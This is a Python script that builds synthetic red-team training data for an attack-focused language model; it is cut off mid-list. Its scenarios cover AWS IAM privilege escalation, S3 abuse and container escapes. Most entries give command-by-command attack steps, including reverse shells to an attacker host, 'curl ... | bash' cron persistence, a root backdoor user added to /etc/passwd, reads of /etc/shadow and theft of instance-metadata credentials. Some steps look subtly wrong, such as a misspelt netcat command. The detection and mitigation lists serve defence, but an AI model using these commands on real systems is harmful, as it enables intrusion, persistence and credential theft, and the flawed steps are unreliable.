#!/usr/bin/env python3
"""acquire_cloud_attack_dataset.py — Generate synthetic cloud security attack
training pairs for AttackLM bucket format.

Covers: AWS IAM privilege escalation, S3 misconfiguration, container escapes,
Kubernetes attacks, serverless exploitation, IMDS abuse, Azure AD attacks,
GCP security exploitation.

Output: data/datasets/buckets/cloud/attacks/data_synth.jsonl
        data/datasets/buckets/cloud/attacks/metadata.json

Usage:
    python scripts/acquire_cloud_attack_dataset.py
    python scripts/acquire_cloud_attack_dataset.py --count 10
    python scripts/acquire_cloud_attack_dataset.py --output /custom/path
"""

from __future__ import annotations

import json
import random
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
BUCKET_DIR = BASE_DIR / "data" / "datasets" / "buckets" / "cloud" / "attacks"
DATA_FILE = BUCKET_DIR / "data_synth.jsonl"
META_FILE = BUCKET_DIR / "metadata.json"

SEED = 42
SOURCE_NAME = "cloud_attack_synthetic"
LICENSE = "MIT"
SYSTEM_PROMPT = (
    "You are an authorized Red Team CLOUD specialist. "
    "You provide precise adversary emulation techniques for security validation."
)

# ---------------------------------------------------------------------------
# Contextual Variables
# ---------------------------------------------------------------------------
ENVIRONMENT_TYPES = [
    "enterprise cloud deployment",
    "multi-cloud environment",
    "AWS environment",
    "Azure environment",
    "GCP environment",
    "Kubernetes cluster",
    "serverless architecture",
    "hybrid cloud",
    "cloud-native application",
    "containerized microservices",
]

SEVERITY_LEVELS = ["critical", "high", "medium", "low"]

TESTING_FRAMEWORKS = [
    "MITRE ATT&CK Cloud Matrix",
    "CIS Benchmarks",
    "NIST SP 800-115",
    "OWASP Cloud Security",
    "PTES",
    "Bug Bounty methodology",
]

# ---------------------------------------------------------------------------
# Cloud Attack Scenarios
# ---------------------------------------------------------------------------
CLOUD_ATTACKS: list[dict] = [
    # === AWS IAM PRIVILEGE ESCALATION ===
    {
        "category": "aws_iam",
        "name": "IAM Privilege Escalation via iam:PassRole + Lambda",
        "mitre_ids": ["T1548.001"],
        "desc": "Escalating privileges by creating a Lambda function with an elevated IAM role.",
        "steps": "1. Enumerate IAM permissions: `aws iam list-attached-user-policies --user-name <user>`\n2. Identify passable roles: `aws iam list-roles --query 'Roles[].RoleName'`\n3. Create Lambda function with admin role: `aws lambda create-function --function-name privesc --role arn:aws:iam::123456789012:role/admin-role --handler index.handler --runtime python3.9 --zip-file fileb://lambda.zip`\n4. Invoke Lambda to create admin user: `aws lambda invoke --function-name privesc output.json`\n5. Assume new admin role: `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role --role-session-name privesc`",
        "detection": [
            "CloudTrail: Lambda creation with elevated role",
            "IAM: Role assumption from unusual source",
            "Lambda invocation from non-standard user",
            "New IAM user/policy creation from Lambda",
        ],
        "mitigations": [
            "Restrict iam:PassRole to specific roles",
            "Tag-based IAM restrictions",
            "CloudTrail monitoring for privilege escalation patterns",
            "Least privilege IAM policies",
        ],
    },
    {
        "category": "aws_iam",
        "name": "IAM Privilege Escalation via sts:AssumeRole",
        "mitre_ids": ["T1548.001"],
        "desc": "Assuming an IAM role with higher privileges than the current user.",
        "steps": "1. List assumable roles: `aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[].Principal.Service!=null]'\n2. Check trust policy: `aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'`\n3. Assume role: `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/admin-role --role-session-name privesc`\n4. Export temporary credentials: `export AWS_ACCESS_KEY_ID=<temp_key>`\n5. Verify escalated access: `aws sts get-caller-identity`",
        "detection": [
            "AssumeRole from unusual principal",
            "Cross-account role assumption",
            "Session duration anomalies",
            "Role chaining (assuming multiple roles in sequence)",
        ],
        "mitigations": [
            "Restrict role trust policies",
            "Require MFA for role assumption",
            "Condition keys for source IP/VPC",
            "Session duration limits",
        ],
    },
    {
        "category": "aws_iam",
        "name": "IAM Privilege Escalation via Access Key Creation",
        "mitre_ids": ["T1548.001"],
        "desc": "Creating access keys for other users to escalate privileges.",
        "steps": "1. Enumerate users: `aws iam list-users`\n2. Create access key for admin: `aws iam create-access-key --user-name admin-user`\n3. Configure credentials: `aws configure --profile escalated`\n4. Verify: `aws sts get-caller-identity --profile escalated`\n5. Clean up: `aws iam delete-access-key --user-name admin-user --access-key-id <key>`",
        "detection": [
            "Access key creation for different user",
            "iam:CreateAccessKey for non-self user",
            "Key usage from unusual IP/location",
            "Multiple keys for same user",
        ],
        "mitigations": [
            "Restrict iam:CreateAccessKey to self",
            "MFA requirement for key creation",
            "CloudTrail alerts for cross-user key creation",
            "Access key rotation policies",
        ],
    },
    {
        "category": "aws_iam",
        "name": "AWS IAM Policy Exploitation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting overly permissive IAM policies for privilege escalation.",
        "steps": '1. Enumerate attached policies: `aws iam list-attached-user-policies --user-name <user>`\n2. Get policy document: `aws iam get-policy-version --policy-arn <arn> --version-id v1`\n3. Identify excessive permissions (e.g., iam:*, s3:*, ec2:*)\n4. Exploit: `aws iam put-user-policy --user-name <user> --policy-name admin --policy-document \'{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}\'`\n5. Create access keys: `aws iam create-access-key --user-name <user>`',
        "detection": [
            "IAM policy changes from non-admin",
            "Policy with Action:* or Resource:*",
            "iam:PutUserPolicy events",
            "Overly permissive policy creation",
        ],
        "mitigations": [
            "IAM policy boundaries",
            "Permissions boundary for all users",
            "CloudTrail monitoring for policy changes",
            "AWS Config rules for IAM policy compliance",
        ],
    },
    {
        "category": "aws_iam",
        "name": "IAM Role Assumption via Instance Profile",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting EC2 instance profiles to assume IAM roles intended for the host instance.",
        "steps": "1. Identify EC2 instances with IAM roles: `aws ec2 describe-instances --query 'Reservations[].Instances[?IamInstanceProfile!=null]'\n2. Compromise application on EC2 instance via vulnerability\n3. Retrieve role credentials from IMDS: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n4. Configure stolen credentials: `aws configure --profile instance-role`\n5. Enumerate role permissions: `aws iam list-attached-role-policies --role-name <role-name>`\n6. Use role for lateral movement or privilege escalation",
        "detection": [
            "EC2 role credentials used from non-EC2 IP",
            "IMDS credential retrieval from unexpected process",
            "Role assumption from compromised instance",
            "Anomalous API calls using instance profile credentials",
        ],
        "mitigations": [
            "IMDSv2 enforcement on all EC2 instances",
            "Tight IAM role permission boundaries",
            "CloudTrail monitoring for instance credential usage patterns",
            "EC2 instance profile rotation and auditing",
        ],
    },
    {
        "category": "aws_iam",
        "name": "IAM Policy Rollback Exploitation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting IAM policy version rollback to restore previously revoked permissions.",
        "steps": "1. List policy versions: `aws iam list-policy-versions --policy-arn <arn>`\n2. Identify a prior version with excessive permissions: `aws iam get-policy-version --policy-arn <arn> --version-id v1`\n3. Set default to older permissive version: `aws iam set-default-policy-version --policy-arn <arn> --version-id v1`\n4. Exploit restored permissions for privilege escalation\n5. Optionally restore current version after exploitation to hide tracks",
        "detection": [
            "Policy version rollback events in CloudTrail",
            "SetDefaultPolicyVersion from non-admin",
            "Policy downgrade to less restrictive version",
            "Permission elevation following policy version change",
        ],
        "mitigations": [
            "Restrict iam:SetDefaultPolicyVersion",
            "CloudTrail alerts for policy version rollbacks",
            "AWS Config rule detecting overly permissive policy versions",
            "Limit number of policy versions retained",
        ],
    },
    {
        "category": "aws_iam",
        "name": "AWS STS AssumeRole Chaining",
        "mitre_ids": ["T1548.001"],
        "desc": "Chaining AssumeRole calls across multiple roles to escalate from low-privilege to admin access.",
        "steps": "1. Enumerate assumable roles from current identity: `aws sts get-caller-identity`\n2. Assume first role: `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/role-a --role-session-name chain1`\n3. From role-a, discover next assumable role: `aws iam list-roles --query 'Roles[].Arn'`\n4. Assume second role using temp credentials: `aws sts assume-role --role-arn arn:aws:iam::123456789012:role/role-b --role-session-name chain2`\n5. Continue chaining until reaching admin-level role\n6. Verify final access level: `aws sts get-caller-identity`",
        "detection": [
            "Rapid successive AssumeRole calls in CloudTrail",
            "Role chain depth exceeding normal patterns",
            "Cross-account role assumption chains",
            "Session duration anomalies from chained assumptions",
        ],
        "mitigations": [
            "Restrict role trust policies to prevent unintended chaining",
            "Maximum session duration limits",
            "CloudTrail correlation of chained role assumptions",
            "Condition keys restricting role assumption paths",
        ],
    },
    {
        "category": "aws_iam",
        "name": "IAM User Creation and Privilege Escalation",
        "mitre_ids": ["T1136.001"],
        "desc": "Creating a new IAM user with elevated permissions as a persistence and escalation mechanism.",
        "steps": "1. Verify iam:CreateUser permission: `aws iam list-attached-user-policies --user-name <current-user>`\n2. Create new IAM user: `aws iam create-user --user-name backdoor-user`\n3. Attach admin policy: `aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`\n4. Create access keys: `aws iam create-access-key --user-name backdoor-user`\n5. Configure new profile: `aws configure --profile backdoor`\n6. Verify elevated access: `aws sts get-caller-identity --profile backdoor`",
        "detection": [
            "New IAM user creation by non-privileged identity",
            "AdministratorAccess policy attachment",
            "Access key creation immediately after user creation",
            "User creation outside normal provisioning workflows",
        ],
        "mitigations": [
            "Restrict iam:CreateUser and iam:AttachUserPolicy",
            "Service Control Policies blocking admin policy attachment",
            "CloudTrail alerts for unauthorized user creation",
            "Break-glass procedures requiring approval for admin users",
        ],
    },
    {
        "category": "aws_iam",
        "name": "AWS Organizations SCP Bypass",
        "mitre_ids": ["T1548.001"],
        "desc": "Bypassing Service Control Policies through misconfigured SCP attachments or exemption lists.",
        "steps": "1. Identify SCP structure: `aws organizations list-policies --filter=SERVICE_CONTROL_POLICY`\n2. Check SCP content: `aws organizations describe-policy --policy-id <id>`\n3. Identify exempted principals or missing Deny statements\n4. Exploit gap: call restricted API from exempted account or principal\n5. Alternatively: if SCP allows iam:* without explicit deny on privilege escalation actions, create admin role: `aws iam create-role --role-name bypass-scp --assume-role-policy-document <trust-policy>`",
        "detection": [
            "API calls that should be blocked by SCP",
            "SCP modification or detachment events",
            "Actions from accounts expected to be restricted",
            "Privilege escalation in SCP-exempted OUs",
        ],
        "mitigations": [
            "Regular SCP audit for gaps and exemptions",
            "Deny-by-default SCP strategy",
            "Monitor SCP detachment events",
            "AWS Organizations access analyzer for effective permissions",
        ],
    },
    {
        "category": "aws_iam",
        "name": "IAM Condition Key Exploitation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting weak or missing IAM condition keys to bypass intended access restrictions.",
        "steps": "1. Retrieve policy documents: `aws iam get-policy-version --policy-arn <arn> --version-id v1`\n2. Analyze conditions for gaps: missing ipaddress, missing ssl, overly broad source VPC\n3. Bypass IP condition by calling from allowed VPC: `aws ec2 describe-instances --profile vpc-role`\n4. Bypass missing ssl condition via HTTP: use non-SSL endpoint where available\n5. Exploit missing resource tag condition: `aws s3api get-object --bucket restricted --key sensitive-file` (tag condition not enforced on GetObject)",
        "detection": [
            "API calls bypassing expected conditions in CloudTrail",
            "Access from unexpected IP ranges",
            "Non-SSL API calls to services requiring encryption",
            "Resource access without required tag conditions",
        ],
        "mitigations": [
            "Use strict condition keys: aws:SourceIp, aws:SecureTransport, aws:ResourceTag",
            "Regular IAM policy audit with IAM Access Analyzer",
            "Enforce SSL on all S3 and API calls",
            "Use VPC endpoints with endpoint policies",
        ],
    },
    # === S3 ===
    {
        "category": "aws_s3",
        "name": "S3 Bucket Misconfiguration Exploitation",
        "mitre_ids": ["T1530"],
        "desc": "Exploiting publicly accessible S3 buckets to exfiltrate data.",
        "steps": "1. Enumerate public buckets: `aws s3 ls` then check each with `aws s3api get-bucket-acl --bucket <name>`\n2. Use tools: `s3scanner - buckets.txt` or `cloudsploit scan`\n3. List bucket contents: `aws s3 ls s3://<bucket> --recursive`\n4. Download sensitive data: `aws s3 sync s3://<bucket> /tmp/s3-data --no-sign-request`\n5. Check for credentials: `grep -r 'password\\|secret\\|api_key' /tmp/s3-data/`",
        "detection": [
            "Public bucket ACL in CloudTrail",
            "Large data downloads from S3",
            "Anonymous access in S3 access logs",
            "Bucket policy allowing * principal",
        ],
        "mitigations": [
            "Block public access at account level",
            "S3 Bucket Policy review",
            "Enable S3 Block Public Access",
            "VPC endpoints for S3 access",
            "Macie for data classification",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 Bucket Enumeration and Data Discovery",
        "mitre_ids": ["T1580"],
        "desc": "Discovering and enumerating S3 buckets belonging to a target organization.",
        "steps": '1. DNS enumeration: `dig <domain> any | grep amazonaws`\n2. Bucket name guessing: `for name in $(cat wordlist.txt); do aws s3 ls s3://$name 2>/dev/null && echo "FOUND: $name"; done`\n3. Use automation: `s3scanner -wordlist bucket-names.txt -output results.txt`\n4. Check permissions: `aws s3api get-bucket-policy-status --bucket <name>`\n5. Check for versioning: `aws s3api get-bucket-versioning --bucket <name>`',
        "detection": [
            "High volume of S3 head/list requests",
            "Bucket name enumeration patterns",
            "Anonymous access attempts from single source",
            "Multiple 404 responses for bucket names",
        ],
        "mitigations": [
            "Random bucket names",
            "Disable S3 public access",
            "CloudTrail data events monitoring",
            "Account-level public access block",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 Object Versioning Exploitation",
        "mitre_ids": ["T1530"],
        "desc": "Accessing previous versions of S3 objects that may contain sensitive data.",
        "steps": "1. Check versioning: `aws s3api get-bucket-versioning --bucket <name>`\n2. List object versions: `aws s3api list-object-versions --bucket <name> --prefix config/`\n3. Download previous version: `aws s3api get-object --bucket <name> --key config/app.yaml --version-id <vid> /tmp/app.yaml.old`\n4. Compare versions: `diff /tmp/app.yaml /tmp/app.yaml.old`\n5. Find credentials in old versions: `grep -i 'password\\|secret\\|key' /tmp/app.yaml.old`",
        "detection": [
            "S3 version listing from unusual sources",
            "GetObject with version-id parameter",
            "Multiple version downloads in short period",
            "Access to previously deleted objects",
        ],
        "mitigations": [
            "Object lifecycle policies",
            "MFA delete for versioned buckets",
            "Object lock for compliance",
            "Access logging for versioned access",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 Pre-signed URL Exploitation",
        "mitre_ids": ["T1530"],
        "desc": "Abusing leaked or overly permissive S3 pre-signed URLs to access restricted objects.",
        "steps": '1. Discover pre-signed URL in application logs, emails, or source code\n2. Extract URL parameters: signature, expiration, object key\n3. Check expiration time: if valid, access object directly: `curl "<presigned-url>"`\n4. If URL allows PUT: `curl -X PUT -d "malicious" "<presigned-url>"`\n5. Enumerate bucket: modify key path in URL to traverse: replace key with \'../\' patterns\n6. Use stolen credentials for wider access: extract bucket name and path from URL structure',
        "detection": [
            "S3 access using pre-signed URLs from unexpected IPs",
            "Pre-signed URL usage after expiration timestamp",
            "PUT requests via pre-signed URLs on read-only objects",
            "Multiple objects accessed via same pre-signed URL",
        ],
        "mitigations": [
            "Short expiration times for pre-signed URLs",
            "Use S3 pre-signed POST with conditions",
            "CloudTrail monitoring for pre-signed URL patterns",
            "Restrict pre-signed URL generation to specific IAM roles",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 Bucket Policy Bypass via Inconsistent Permissions",
        "mitre_ids": ["T1530"],
        "desc": "Exploiting inconsistencies between bucket policies, ACLs, and IAM policies to gain unintended access.",
        "steps": "1. Check bucket ACL: `aws s3api get-bucket-acl --bucket <name>`\n2. Check bucket policy: `aws s3api get-bucket-policy --bucket <name>`\n3. Check IAM policy: `aws iam get-policy-version --policy-arn <arn> --version-id v1`\n4. Identify permission gaps: e.g., ACL allows WRITE but policy denies, or vice versa\n5. Exploit gap: if ACL grants WRITE to authenticated users: `aws s3 cp malicious.txt s3://<bucket>/ --profile any-aws-user`\n6. If IAM allows s3:* but bucket policy only restricts specific prefixes, access unrestricted prefixes",
        "detection": [
            "S3 access inconsistent with bucket policy intent",
            "Cross-account access via ACL bypass",
            "Authenticated users access on ACL",
            "Policy evaluation log discrepancies",
        ],
        "mitigations": [
            "Consistent permission evaluation across ACL, policy, and IAM",
            "Disable ACLs on buckets (use bucket policies only)",
            "S3 Object Ownership setting to BucketOwnerEnforced",
            "AWS Config rule for S3 bucket public access",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 Server-Side Encryption Override",
        "mitre_ids": ["T1565.001"],
        "desc": "Overriding server-side encryption settings on S3 objects to weaken data protection.",
        "steps": "1. Identify bucket encryption: `aws s3api get-bucket-encryption --bucket <name>`\n2. Check if bucket policy enforces SSE: look for required encryption in policy\n3. If not enforced, upload unencrypted object: `aws s3 cp sensitive.txt s3://<bucket>/ --no-progress`\n4. Override SSE-KMS to SSE-S3: `aws s3api copy-object --bucket <bucket> --key sensitive.txt --copy-source <bucket>/sensitive.txt --server-side-encryption AES256`\n5. Re-encrypt with weaker key or no encryption to reduce protection level",
        "detection": [
            "S3 object uploaded without required encryption",
            "Encryption type change on existing objects",
            "SSE-KMS to SSE-S3 downgrade events",
            "CopyObject with different encryption settings",
        ],
        "mitigations": [
            "Enforce encryption via bucket policy (aws:SecureTransport condition)",
            "S3 Bucket Key with mandatory SSE-KMS",
            "AWS Config rule for unencrypted S3 objects",
            "Deny s3:PutObject without server-side encryption in bucket policy",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 Event Notification Injection",
        "mitre_ids": ["T1530"],
        "desc": "Injecting or modifying S3 event notification configurations to redirect data or trigger malicious Lambda functions.",
        "steps": '1. Check existing notifications: `aws s3api get-bucket-notification-configuration --bucket <name>`\n2. Identify permission to put notification config: `aws iam list-attached-user-policies --user-name <user>`\n3. Add malicious Lambda trigger: `aws s3api put-bucket-notification-configuration --bucket <name> --notification-configuration \'{"LambdaFunctionConfigurations":[{"LambdaFunctionArn":"arn:aws:lambda:region:account:function:malicious-fn","Events":["s3:ObjectCreated:*"]}]}\'`\n4. Every new object upload triggers attacker Lambda\n5. Or redirect SNS/SQS notifications: `aws s3api put-bucket-notification-configuration --bucket <name> --notification-configuration \'{"QueueConfigurations":[{"QueueArn":"arn:aws:sqs:region:account:attacker-queue","Events":["s3:ObjectCreated:*"]}]}\'`',
        "detection": [
            "S3 notification configuration changes in CloudTrail",
            "New Lambda trigger on sensitive bucket",
            "Notification destination pointing to external account",
            "Unexpected SQS/SNS subscription on bucket events",
        ],
        "mitigations": [
            "Restrict s3:PutBucketNotificationConfiguration",
            "Monitor notification config changes via CloudTrail",
            "Require approval for Lambda triggers on sensitive buckets",
            "S3 event notification auditing via AWS Config",
        ],
    },
    {
        "category": "aws_s3",
        "name": "S3 CORS Misconfiguration Exploitation",
        "mitre_ids": ["T1530"],
        "desc": "Exploiting overly permissive S3 CORS configurations to steal data from victim's browser context.",
        "steps": '1. Check CORS configuration: `aws s3api get-bucket-cors --bucket <name>`\n2. Identify permissive AllowedOrigins (e.g., *) or AllowedMethods\n3. From attacker site, make cross-origin request: `fetch("https://<bucket>.s3.amazonaws.com/sensitive-data.json")`\n4. Browser sends request with Origin header; S3 responds with CORS headers allowing access\n5. Exfiltrate data via JavaScript: attacker page reads response and sends to C2\n6. Upload data if PUT is allowed: `fetch("https://<bucket>.s3.amazonaws.com/malicious.js", {method: "PUT", body: "..."})`',
        "detection": [
            "S3 CORS configuration changes allowing wildcard origins",
            "Cross-origin requests from unexpected referrers",
            "S3 access logs showing browser-based data exfiltration",
            "CORS preflight requests from external domains",
        ],
        "mitigations": [
            "Restrict AllowedOrigins to specific domains",
            "Never use wildcard (*) for AllowedOrigins on sensitive buckets",
            "Regular CORS configuration audit",
            "Use CloudFront with proper origin headers instead of direct S3 CORS",
        ],
    },
    # === CONTAINER ESCAPES ===
    {
        "category": "container_escape",
        "name": "Docker Container Escape via Privileged Mode",
        "mitre_ids": ["T1611"],
        "desc": "Escaping from a privileged Docker container to the host system.",
        "steps": "1. Check if privileged: `cat /proc/1/status | grep CapEff` (should show all capabilities)\n2. Mount host filesystem: `mount /dev/sda1 /mnt/host`\n3. Access host files: `cat /mnt/host/etc/shadow`\n4. Create cron job on host: `echo '* * * * * root /bin/bash -i >& /dev/tcp/<attacker>/4444 0>&1' >> /mnt/host/var/spool/cron/crontabs/root`\n5. Write SSH key: `echo '<pubkey>' >> /mnt/host/root/.ssh/authorized_keys`\n6. Or: `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`",
        "detection": [
            "Privileged container creation events",
            "Host filesystem mount operations from container",
            "nsenter execution inside container",
            "Container with all Linux capabilities",
        ],
        "mitigations": [
            "Never run containers in privileged mode",
            "Use security contexts with minimal capabilities",
            "Seccomp profiles to restrict syscalls",
            "Pod security policies/standards",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via cgroups",
        "mitre_ids": ["T1611"],
        "desc": "Escaping container via cgroups release_agent mechanism.",
        "steps": "1. Verify cgroup v1: `cat /proc/1/cgroup`\n2. Create cgroup: `mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp`\n3. Create notification: `echo 1 > /tmp/cgrp/notify_on_release`\n4. Set host path for release_agent: `echo '/tmp/cmd' > /tmp/cgrp/release_agent`\n5. Write command to host: `echo '#!/bin/sh\\npcat <attacker> 4444 -e /bin/sh' > /tmp/cmd`\n6. Trigger: `echo 0 > /tmp/cgrp/cgroup.procs` (causes release_agent to execute on host)",
        "detection": [
            "cgroup modification inside container",
            "release_agent file writes",
            "Container escape via /proc/cgroup",
            "Unexpected host process execution",
        ],
        "mitigations": [
            "Use cgroup v2",
            "Seccomp profiles blocking cgroup operations",
            "Restrict CAP_SYS_ADMIN capability",
            "Run containers as non-root",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via Kubernetes API",
        "mitre_ids": ["T1609"],
        "desc": "Using Kubernetes API from within a pod to escape to other pods or the node.",
        "steps": '1. Find service account token: `cat /var/run/secrets/kubernetes.io/serviceaccount/token`\n2. Enumerate permissions: `kubectl auth can-i --list` (if kubectl available)\n3. Or via API: `curl -sk https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces -H "Authorization: Bearer $TOKEN"`\n4. List pods: `curl -sk https://$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods -H "Authorization: Bearer $TOKEN"`\n5. Exec into another pod: `curl -sk https://$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/pods/<target>/exec?command=/bin/bash -H "Authorization: Bearer $TOKEN"`\n6. Create privileged pod: submit pod manifest with privileged security context',
        "detection": [
            "Service account token usage from unexpected pods",
            "Kubernetes API enumeration from pods",
            "Pod exec commands from unexpected sources",
            "Privileged pod creation events",
        ],
        "mitigations": [
            "Restrict service account permissions (RBAC)",
            "Disable automountServiceAccountToken where not needed",
            "Network policies limiting pod-to-API communication",
            "Admission controllers blocking privileged pods",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via Host Path Mount",
        "mitre_ids": ["T1611"],
        "desc": "Escaping container through mounted host paths.",
        "steps": '1. Check for host mounts: `mount | grep "/dev"` or `cat /proc/1/mountinfo`\n2. Identify host root mount: `/hostfs` or `/var/lib/docker` or `/`\n3. Access host filesystem: `ls /hostfs/etc/shadow`\n4. Write cron job: `echo "* * * * * root curl http://attacker/shell.sh | bash" > /hostfs/var/spool/cron/root`\n5. Write SSH key: `echo "<pubkey>" >> /hostfs/root/.ssh/authorized_keys`\n6. Modify /etc/passwd: `echo "hacker:0:0:root:/root:/bin/bash" >> /hostfs/etc/passwd`',
        "detection": [
            "Container with host path mounts",
            "Write operations to host filesystem from container",
            "Sensitive file access (/etc/shadow, /root/.ssh)",
            "Cron job creation from container process",
        ],
        "mitigations": [
            "Avoid mounting host filesystem in containers",
            "Read-only mounts where necessary",
            "Pod security standards enforcement",
            "Admission controllers for volume mounts",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via Docker Socket Mount",
        "mitre_ids": ["T1611"],
        "desc": "Escaping from a container with the Docker socket mounted to execute arbitrary containers on the host.",
        "steps": '1. Check for Docker socket: `ls -la /var/run/docker.sock`\n2. Test Docker access: `docker ps` or `curl --unix-socket /var/run/docker.sock http://localhost/containers/json`\n3. Create privileged container: `docker run -v /:/hostfs --privileged --name escape alpine`\n4. Or via API: `curl --unix-socket /var/run/docker.sock -X POST http://localhost/containers/create -H "Content-Type: application/json" -d "{\\"Image\\":\\"alpine\\",\\"Cmd\\":[\\"/bin/sh\\"],\\"HostConfig\\":{\\"Privileged\\":true,\\"Binds\\":[\\"/:/hostfs\\"]}}"`\n5. Access host filesystem: `ls /hostfs/etc/shadow`\n6. Write SSH key: `echo \'<pubkey>\' >> /hostfs/root/.ssh/authorized_keys`',
        "detection": [
            "Container with Docker socket mount",
            "Docker API calls from container process",
            "Privileged container creation from within container",
            "Container creation events matching known escape patterns",
        ],
        "mitigations": [
            "Never mount Docker socket into containers",
            "Use Docker-in-Docker alternatives (Kaniko, Buildah)",
            "Admission controllers blocking docker.sock mounts",
            "Seccomp policies restricting Docker API calls",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via Volume Mount",
        "mitre_ids": ["T1611"],
        "desc": "Escaping from a container through sensitive host volume mounts like /proc, /sys, or root filesystem.",
        "steps": "1. Enumerate mounted volumes: `cat /proc/1/mountinfo | grep -E '/proc|/sys|/dev'`\n2. Check for root volume: `mount | grep 'type ext4'` or `mount | grep '/dev/sda'`\n3. If /proc is mounted writeable: `echo 1 > /proc/sysrq-trigger`\n4. If host root is mounted: `ls -la /hostpath/root/.ssh/`\n5. Access Kubernetes secrets: `ls /var/lib/kubelet/pods/`\n6. Write cron job: `echo '* * * * * root /reverse_shell.sh' > /hostpath/var/spool/cron/root`",
        "detection": [
            "Container with sensitive volume mounts (/proc, /sys)",
            "Host root filesystem volume mount events",
            "Kubelet pod directory access from container",
            "Write operations to mounted host paths",
        ],
        "mitigations": [
            "Avoid mounting sensitive host directories",
            "Use emptyDir or ConfigMap volumes for pod data",
            "Pod security standards restricting volume types",
            "Admission controllers validating volume mounts",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via hostPID/hostIPC",
        "mitre_ids": ["T1611"],
        "desc": "Escaping from a container with hostPID or hostIPC namespace sharing to access host processes and memory.",
        "steps": '1. Check namespace sharing: `cat /proc/1/status | grep -i NSpid` or inspect pod spec for hostPID/hostIPC\n2. With hostPID: list host processes: `ps aux`\n3. Inspect host process memory: `cat /proc/<host_pid>/maps`\n4. Read process environment (may contain secrets): `cat /proc/<host_pid>/environ | tr "\\0" "\\n"`\n5. With hostIPC: access shared memory segments: `ipcs -m`\n6. Read shared memory: `ipcs -m | grep <shmid>` then attach and read: `dd if=/dev/shm/<segment> bs=4096`',
        "detection": [
            "Pod spec with hostPID or hostIPC enabled",
            "Process listing from container showing host PIDs",
            "/proc/<high_pid>/environ access from container",
            "Shared memory segment access from container namespace",
        ],
        "mitigations": [
            "Avoid hostPID and hostIPC in pod specs",
            "Pod security standards enforcing restricted policy",
            "Admission controllers blocking host namespace sharing",
            "Runtime security monitoring for namespace escape",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via Capabilities (CAP_SYS_ADMIN)",
        "mitre_ids": ["T1611"],
        "desc": "Escaping from a container with CAP_SYS_ADMIN capability to gain full host access.",
        "steps": "1. Check capabilities: `capsh --print | grep cap_sys_admin` or `cat /proc/1/status | grep CapEff`\n2. With CAP_SYS_ADMIN: mount cgroup: `mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp`\n3. Write release_agent: `echo '/host_cmd' > /tmp/cgrp/release_agent`\n4. Trigger host execution: `echo 1 > /tmp/cgrp/notify_on_release`\n5. Alternative: use mount to access host filesystem: `mount /dev/sda1 /mnt/host`\n6. Or use nsenter: `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`",
        "detection": [
            "Container with CAP_SYS_ADMIN capability",
            "cgroup mount operations from container",
            "Host filesystem mount from container namespace",
            "nsenter execution inside container",
        ],
        "mitigations": [
            "Drop all capabilities by default, add only required ones",
            "Seccomp profiles blocking mount and nsenter",
            "Pod security standards enforcing restricted capabilities",
            "Admission controllers dropping CAP_SYS_ADMIN",
        ],
    },
    {
        "category": "container_escape",
        "name": "Container Escape via Capabilities (CAP_SYS_PTRACE)",
        "mitre_ids": ["T1611"],
        "desc": "Escaping from a container with CAP_SYS_PTRACE capability by injecting code into host processes.",
        "steps": "1. Check capabilities: `capsh --print | grep cap_sys_ptrace`\n2. List host processes (if hostPID): `ps aux`\n3. Attach to host process with gdb: `gdb -p <host_pid>`\n4. Inject shellcode: `(gdb) call (int)system(\"/bin/bash -c '/reverse_shell'\")`\n5. Alternative: use ptrace directly: write C program that uses ptrace() to inject into host init process\n6. Or: inject shared library into host process: `ptrace(PTRACE_ATTACH, <host_pid>, NULL, NULL)` then `ptrace(PTRACE_POKETEXT, ...)`",
        "detection": [
            "Container with CAP_SYS_PTRACE capability",
            "ptrace system calls from container process",
            "gdb or strace execution inside container",
            "Process injection events detected by runtime security",
        ],
        "mitigations": [
            "Drop CAP_SYS_PTRACE from all containers",
            "Seccomp profiles blocking ptrace syscalls",
            "AppArmor profiles restricting process attachment",
            "Runtime security tools monitoring for process injection",
        ],
    },
    {
        "category": "container_escape",
        "name": "Kubernetes Pod Escape via Node Proxy",
        "mitre_ids": ["T1609"],
        "desc": "Using Kubernetes node proxy permissions to escape from a pod to the underlying node.",
